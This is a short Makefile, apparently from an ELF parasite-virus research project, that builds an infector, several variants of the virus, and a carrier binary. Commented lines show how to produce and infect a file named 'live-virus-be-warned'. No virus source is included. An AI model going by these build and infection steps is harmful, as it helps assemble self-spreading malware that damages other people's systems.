   CC = gcc
   CFLAGS = -O2 -fomit-frame-pointer -g # -Wall
   CLEANFILES =    infect-elf-p elf-p-virus-debug vpatch elf-p-virus-egg \
           elf-p-virus-nodebug elf-entry elf-text2egg elf-p-virus.s \
           null-carrier

   all:    infect-elf-p elf-p-virus vpatch elf-entry elf-text2egg carrier

   elf-text2egg:   elf-text2egg.c
       $(CC) $(CFLAGS) elf-text2egg.c -o elf-text2egg

   elf-entry:  elf-entry.c
       $(CC) $(CFLAGS) elf-entry.c -o elf-entry

   vpatch: vpatch.c
       $(CC) $(CFLAGS) vpatch.c -o vpatch

   infect-elf-p:   parasite.c infect-elf-p.c
       $(CC) $(CFLAGS) parasite.c infect-elf-p.c -o infect-elf-p

   elf-p-virus:    elf-p-virus.c
       $(CC) $(CFLAGS) -DDEBUG elf-p-virus.c -o elf-p-virus-debug
       $(CC) -Wall -O2 -static -g elf-p-virus.c -o elf-p-virus-nodebug
       $(CC) -Wall -O2 -static -S elf-p-virus.c

   #   cp elf-p-virus.s elf-p-virus-egg.c

   elf-p-virus-egg:    elf-p-virus-egg.c
       $(CC) -O2 -Wall -g -static elf-p-virus-egg.c -o elf-p-virus-egg

   carrier:    carrier.S
       $(CC) -nostdlib carrier.S -o null-carrier

   #   cp null-carrier live-virus-be-warned
   #   ./infect-elf-p live-virus-be-warned
   #   chmod 0 live-virus-be-warned

   clean:
       rm -f $(CLEANFILES)
